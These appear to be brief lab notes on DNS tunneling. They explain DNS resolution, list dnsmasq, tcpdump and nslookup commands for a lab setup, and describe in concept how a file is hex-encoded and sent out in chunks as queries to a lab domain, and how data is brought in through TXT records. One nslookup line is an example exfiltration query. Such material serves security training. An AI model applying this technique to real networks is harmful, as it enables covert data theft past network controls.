#### DNS Tunnel
DNS

We will try to connect to www.example.com
To obtain an IP address for a domain name, first we ask a DNS recursive resolver for the DNS address record (the A record).
An A record is a DNSD data type that contains an IPv4 address/ The recursive resolver will make all the DNS queries until the IP is found.
First it sends a query to one of the 13 root name servers around the world. Then the root name responds with the address of the DNS server responsible for all .com domains. This is called the TLD name server. The TLD name server then points us to the authoritative name server for example.com. The authoritative name server returns us the A record.

Set up the Lab

Issue the commands on the Authortative DNS server:
sudo dnsmasq -C dnsmasq.conf -d
sudo tcpdump -i ens192 udp port 53
resolvectl status
nslookup exfiltrated-data.feline.corp
sudo tcpdump -i ens192 udp port 53

So our network looks like this:



Exfiltration attack overview:

This would require a series of sequential requests. We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary. We won't go into further details here, but this should clarify the general concept of DNS network exfiltration.

Serve TXT records from the Authoritativce server
sudo dnsmasq -C dnsmasq_txt.conf -d

On the target machine, attempt to retrieve the TXT record.
nslookup -type=txt www.feline.corp

If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and convert that back into binary on the internal server.


